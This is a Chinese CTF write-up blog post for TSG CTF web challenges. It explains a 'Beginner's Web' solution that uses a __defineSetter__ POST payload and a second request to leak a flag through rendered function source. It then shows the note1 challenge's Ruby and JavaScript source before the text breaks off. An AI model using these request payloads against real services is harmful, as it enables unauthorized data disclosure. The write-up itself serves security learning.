<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>TSG CTF复现 - LionTree</title>
  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content=writeup>
  
  
  
    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
  

  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.1"></head>

  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">LionTree</a>
    <div class="subtitle"></div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">Home</a>
        </li>
      
        <li class="menu-item">
          <a href="/summary" class="menu-item-link">Summary</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">About</a>
        </li>
      
        <li class="menu-item">
          <a href="/atom.xml" class="menu-item-link">RSS</a>
        </li>
      
    </ul>
  </nav>
</header>

<article class="post">
  <div class="post-title">
    <h1 class="article-title">TSG CTF复现</h1>
  </div>

  <!-- 文章目录 -->
  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Beginner’s-Web"><span class="toc-text">Beginner’s Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#解法"><span class="toc-text">解法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Object-prototype-defineSetter"><span class="toc-text">Object.prototype.__defineSetter__()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#await-new-Promise"><span class="toc-text">await new Promise</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#javascript容错性"><span class="toc-text">javascript容错性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Function-prototype-toString"><span class="toc-text">Function.prototype.toString()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#References"><span class="toc-text">References</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#note1"><span class="toc-text">note1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#正则注入"><span class="toc-text">正则注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OOB"><span class="toc-text">OOB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#References-1"><span class="toc-text">References</span></a></li></ol></li></ol></li></ol>

  <div class="post-content">
    <p>又双叒叕爆零…学到了一个新词：beginner…惨惨</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Beginner’s-Web"><a href="#Beginner’s-Web" class="headerlink" title="Beginner’s Web"></a>Beginner’s Web</h2><p>好一个beginner，不过这题还是很有意思的</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fastify = <span class="built_in">require</span>(<span class="string">'fastify'</span>);</span><br><span class="line"><span class="keyword">const</span> nunjucks = <span class="built_in">require</span>(<span class="string">'nunjucks'</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> converters = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flagConverter = <span class="function">(<span class="params">input, callback</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> flag = <span class="string">'*** CENSORED ***'</span>;</span><br><span class="line">  callback(<span class="literal">null</span>, flag);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> base64Converter = <span class="function">(<span class="params">input, callback</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> result = Buffer.from(input).toString(<span class="string">'base64'</span>);</span><br><span class="line">    callback(<span class="literal">null</span>, result)</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    callback(error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> scryptConverter = <span class="function">(<span class="params">input, callback</span>) =&gt;</span> &#123;</span><br><span class="line">  crypto.scrypt(input, <span class="string">'I like sugar'</span>, <span class="number">64</span>, (error, key) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">      callback(error);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      callback(<span class="literal">null</span>, key.toString(<span class="string">'hex'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = fastify();</span><br><span class="line">app.register(<span class="built_in">require</span>(<span class="string">'point-of-view'</span>), &#123;<span class="attr">engine</span>: &#123;nunjucks&#125;&#125;);</span><br><span class="line">app.register(<span class="built_in">require</span>(<span class="string">'fastify-formbody'</span>));</span><br><span class="line">app.register(<span class="built_in">require</span>(<span class="string">'fastify-cookie'</span>));</span><br><span class="line">app.register(<span class="built_in">require</span>(<span class="string">'fastify-session'</span>), &#123;<span class="attr">secret</span>: <span class="built_in">Math</span>.random().toString(<span class="number">2</span>), <span class="attr">cookie</span>: &#123;<span class="attr">secure</span>: <span class="literal">false</span>&#125;&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="keyword">async</span> (request, reply) =&gt; &#123;</span><br><span class="line">  reply.view(<span class="string">'index.html'</span>, &#123;<span class="attr">sessionId</span>: request.session.sessionId&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="keyword">async</span> (request, reply) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (request.body.converter.match(<span class="regexp">/[FLAG]/</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Don't be evil :)"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (request.body.input.length &lt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Too short :('</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  converters[<span class="string">'base64'</span>] = base64Converter;</span><br><span class="line">  converters[<span class="string">'scrypt'</span>] = scryptConverter;</span><br><span class="line">  converters[<span class="string">`FLAG_<span class="subst">$&#123;request.session.sessionId&#125;</span>`</span>] = flagConverter;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    converters[request.body.converter](request.body.input, (error, result) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        reject(error);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        resolve(result);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  reply.view(<span class="string">'index.html'</span>, &#123;</span><br><span class="line">    input: request.body.input,</span><br><span class="line">    result,</span><br><span class="line">    sessionId: request.session.sessionId,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.setErrorHandler(<span class="function">(<span class="params">error, request, reply</span>) =&gt;</span> &#123;</span><br><span class="line">  reply.view(<span class="string">'index.html'</span>, &#123;error, <span class="attr">sessionId</span>: request.session.sessionId&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">59101</span>, <span class="string">'0.0.0.0'</span>);</span><br></pre></td></tr></table></figure>

<h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>先说下解法</p>
<ul>
<li>发送post请求(<code>FLAG_l4KILh2scJrJ4zF_Yd8Uu6HODdfZeNEP</code>要按照不同的session id来)</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input=FLAG_l4KILh2scJrJ4zF_Yd8Uu6HODdfZeNEP&amp;converter=__defineSetter__</span><br></pre></td></tr></table></figure>

<p>这时页面会卡在那里</p>
<ul>
<li>另外再开一个页面，随便发一个post请求，比如</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input=aaaaaaaaaaaaa&amp;converter=base64</span><br></pre></td></tr></table></figure>

<p>这时原来那个卡住的页面就会报错显示<code>flagConverter</code>的代码，其中就包含了flag</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="Object-prototype-defineSetter"><a href="#Object-prototype-defineSetter" class="headerlink" title="Object.prototype.__defineSetter__()"></a><code>Object.prototype.__defineSetter__()</code></h4><p>参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/__defineSetter__" target="_blank" rel="noopener">MDN文档</a></p>
<blockquote>
<p><strong>defineSetter</strong> 方法可以将一个函数绑定在当前对象的指定属性上，当那个属性被赋值时，你所绑定的函数就会被调用</p>
</blockquote>
<p>因此当我们传入</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input=FLAG_l4KILh2scJrJ4zF_Yd8Uu6HODdfZeNEP&amp;converter=__defineSetter__</span><br></pre></td></tr></table></figure>

<p>会将</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(error, result) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        reject(error);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        resolve(result);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>绑定到<code>converter[FLAG_l4KILh2scJrJ4zF_Yd8Uu6HODdfZeNEP]</code></p>
<h4 id="await-new-Promise"><a href="#await-new-Promise" class="headerlink" title="await new Promise"></a><code>await new Promise</code></h4><p><code>Promise</code>代表了一个异步操作的最终完成或者失败，而<code>await new Promise</code>会暂停当前 <code>async function</code> 的执行，让主线程先去执行<code>async function</code>外的代码，等待<code>Promise</code>的返回</p>
<p>那么为什么第一个请求发出后会卡住呢？</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> result = <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    converters[request.body.converter](request.body.input, (error, result) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        reject(error);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        resolve(result);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>只有执行了<code>reject(error)</code>或者<code>resolve(result)</code>后<code>Promise</code>才会返回，但</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(error, result) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        reject(error);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        resolve(result);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>需要在<code>base64Converter</code>或者<code>scryptConverter</code>调用，因此第一个请求发出后就一直卡在了<code>await new Promise</code>这里</p>
<h4 id="javascript容错性"><a href="#javascript容错性" class="headerlink" title="javascript容错性"></a>javascript容错性</h4><p>javascript可以接受比形参个数少的实参，比如</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a,b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="string">'a'</span>); <span class="comment">//a undefined</span></span><br></pre></td></tr></table></figure>

<p>当第二个请求发送过来时，因为在<code>converter[FLAG_l4KILh2scJrJ4zF_Yd8Uu6HODdfZeNEP]</code>上设置了<code>Setter</code>,<br><code>converters[`FLAG_${request.session.sessionId}`] = flagConverter;</code>会调用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(error, result) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        reject(error);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        resolve(result);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>传入的参数只有一个，所以</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">error=flagConverter</span><br><span class="line">result=<span class="literal">undefined</span></span><br></pre></td></tr></table></figure>

<p>然后<code>reject(error);</code>使第一个请求的<code>Promise</code>返回（因为nodejs是<strong>单线程</strong>的，所以第二个请求能够影响到第一个请求），同时抛出一个<code>rejectionhandled</code>错误，该错误被<code>error handler</code>捕获</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.setErrorHandler(<span class="function">(<span class="params">error, request, reply</span>) =&gt;</span> &#123;</span><br><span class="line">  reply.view(<span class="string">'index.html'</span>, &#123;error, <span class="attr">sessionId</span>: request.session.sessionId&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这时将<code>flagConverter</code>作为<code>error</code>渲染</p>
<h4 id="Function-prototype-toString"><a href="#Function-prototype-toString" class="headerlink" title="Function.prototype.toString()"></a><code>Function.prototype.toString()</code></h4><p>为什么将函数渲染会返回其源代码呢？</p>
<ul>
<li>首先要看模板渲染的原理。模板渲染时会动态生成一段js代码</li>
</ul>
<p><img src="/images/nodejs%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93.JPG" alt=""></p>
<p>实际上是把模板文件中的html拆分开，和用户传入的变量进行字符串拼接</p>
<ul>
<li>javascript是弱类型语言，并且万物皆对象</li>
</ul>
<p>因此当把函数和字符串进行拼接时，会调用<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/toString" target="_blank" rel="noopener">Function.prototype.toString()</a>将函数转为字符串，该方法会返回一个表示函数源代码的字符串</p>
<p>一个简单的示例</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a, b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'aaaaa'</span>+f);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">aaaaafunction (a, b) &#123;</span></span><br><span class="line"><span class="comment">    console.log(a, b)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>对js内置方法的运用:<code>Object.prototype.__defineSetter__()</code>和<code>Function.prototype.toString()</code></li>
<li>对js异步编程的了解</li>
<li>js的容错性和弱类型转换</li>
<li>javascript是世界上最好的语言（确信</li>
</ul>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul>
<li><a href="https://gist.github.com/0xParrot/310b71266ca2a6bfcaf26b5419c91a0d" target="_blank" rel="noopener">https://gist.github.com/0xParrot/310b71266ca2a6bfcaf26b5419c91a0d</a></li>
<li><a href="https://github.com/TeamUnderdawgs/CTF-Docs/blob/master/TsgCTF2020/Web/Beginners-Web.md" target="_blank" rel="noopener">https://github.com/TeamUnderdawgs/CTF-Docs/blob/master/TsgCTF2020/Web/Beginners-Web.md</a></li>
</ul>
<h2 id="note1"><a href="#note1" class="headerlink" title="note1"></a>note1</h2><p>进去之后是一个记事本的功能</p>
<p><img src="/images/TSGCTF_note.JPG" alt=""></p>
<p>给了ruby的后端代码和一个worker.js</p>
<ul>
<li>app.rb</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'rack/contrib'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/base'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/json'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sqlite3'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> &lt; Sinatra::Base</span></span><br><span class="line">  DB = SQLite3::Database.new <span class="string">'data/db.sqlite3'</span></span><br><span class="line">  DB.execute &lt;&lt;-SQL</span><br><span class="line">    CREATE TABLE IF NOT EXISTS notes (</span><br><span class="line">      id INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">      user_id TEXT,</span><br><span class="line">      content TEXT</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    CREATE TABLE IF NOT EXISTS tokens (</span><br><span class="line">      id TEXT PRIMARY KEY,</span><br><span class="line">      remain INTEGER</span><br><span class="line">    );</span><br><span class="line">  SQL</span><br><span class="line"></span><br><span class="line">  DB.execute &lt;&lt;-SQL</span><br><span class="line">    INSERT OR REPLACE INTO notes (id, user_id, content)</span><br><span class="line">    VALUES (<span class="number">0</span>, <span class="string">'<span class="subst">#&#123;ENV[<span class="string">'FLAG_USER_ID'</span>]&#125;</span>'</span>, <span class="string">'<span class="subst">#&#123;ENV[<span class="string">'FLAG_CONTENT'</span>]&#125;</span>'</span>);</span><br><span class="line">  SQL</span><br><span class="line"></span><br><span class="line">  use Rack::JSONBodyParser</span><br><span class="line">  use Rack::Session::Cookie, <span class="symbol">secret:</span> ENV[<span class="string">'SECRET'</span>], <span class="symbol">old_secret:</span> ENV[<span class="string">'OLD_SECRET'</span>]</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">err</span><span class="params">(code, message)</span></span></span><br><span class="line">    [code, json(&#123;<span class="symbol">message:</span> message&#125;)]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  post <span class="string">'/api/register'</span> <span class="keyword">do</span></span><br><span class="line">    session[<span class="symbol">:user</span>] = SecureRandom.hex(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    json(&#123;&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  post <span class="string">'/api/logout'</span> <span class="keyword">do</span></span><br><span class="line">    session[<span class="symbol">:user</span>] = <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">    json(&#123;&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  get <span class="string">'/api/note'</span> <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">return</span> err(<span class="number">401</span>, <span class="string">'login first'</span>) <span class="keyword">unless</span> user = session[<span class="symbol">:user</span>]</span><br><span class="line"></span><br><span class="line">    sleep <span class="number">0</span>.<span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">      res = DB.query <span class="string">'SELECT id, content FROM notes WHERE user_id = ? ORDER BY id'</span>, user</span><br><span class="line">      notes = []</span><br><span class="line">      res.each <span class="keyword">do</span> <span class="params">|row|</span></span><br><span class="line">        notes &lt;&lt; &#123;<span class="symbol">id:</span> row[<span class="number">0</span>], <span class="symbol">content:</span> row[<span class="number">1</span>]&#125;</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      res.close</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    json(notes)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  post <span class="string">'/api/note'</span> <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">return</span> err(<span class="number">401</span>, <span class="string">'register first'</span>) <span class="keyword">unless</span> user = session[<span class="symbol">:user</span>]</span><br><span class="line">    <span class="keyword">return</span> err(<span class="number">403</span>, <span class="string">'no note :rolling_on_the_floor_laughing:'</span>) <span class="keyword">unless</span> note = params[<span class="symbol">:note</span>] <span class="keyword">and</span> String === note <span class="keyword">and</span> note.bytesize &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> err(<span class="number">403</span>, <span class="string">'too large note'</span>) <span class="keyword">unless</span> note.bytesize &lt; <span class="number">500</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">      res = DB.query <span class="string">'SELECT COUNT(1) FROM notes WHERE user_id = ?'</span>, user</span><br><span class="line">      row = res.<span class="keyword">next</span></span><br><span class="line">      count = row &amp;&amp; row[<span class="number">0</span>]</span><br><span class="line">      res.close</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> err(<span class="number">403</span>, <span class="string">'too many notes'</span>) <span class="keyword">unless</span> count &lt; <span class="number">50</span></span><br><span class="line"></span><br><span class="line">    DB.execute <span class="string">'INSERT INTO notes (user_id, content) VALUES (?, ?)'</span>, user, note</span><br><span class="line"></span><br><span class="line">    json(&#123;&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  delete <span class="string">'/api/note/:id'</span> <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">return</span> err(<span class="number">401</span>, <span class="string">'login first'</span>) <span class="keyword">unless</span> user = session[<span class="symbol">:user</span>]</span><br><span class="line">    puts params[<span class="symbol">:id</span>]</span><br><span class="line">    <span class="keyword">return</span> err(<span class="number">404</span>, <span class="string">'no note'</span>) <span class="keyword">unless</span> id = params[<span class="symbol">:id</span>] <span class="keyword">and</span> (String === id <span class="keyword">or</span> Integer === id) <span class="keyword">and</span> id = id.to_i</span><br><span class="line"></span><br><span class="line">    DB.execute <span class="string">'DELETE FROM notes WHERE id = ? AND user_id = ?'</span>, id, user</span><br><span class="line"></span><br><span class="line">    <span class="number">200</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<ul>
<li>worker.js</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer'</span>);</span><br><span class="line"><span class="keyword">const</span> Redis = <span class="built_in">require</span>(<span class="string">'ioredis'</span>);</span><br><span class="line"><span class="keyword">const</span> connection = <span class="keyword">new</span> Redis(<span class="number">6379</span>, <span class="string">'redis'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> browser_option = &#123;</span><br><span class="line">    product: <span class="string">'firefox'</span>,</span><br><span class="line">    headless: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; 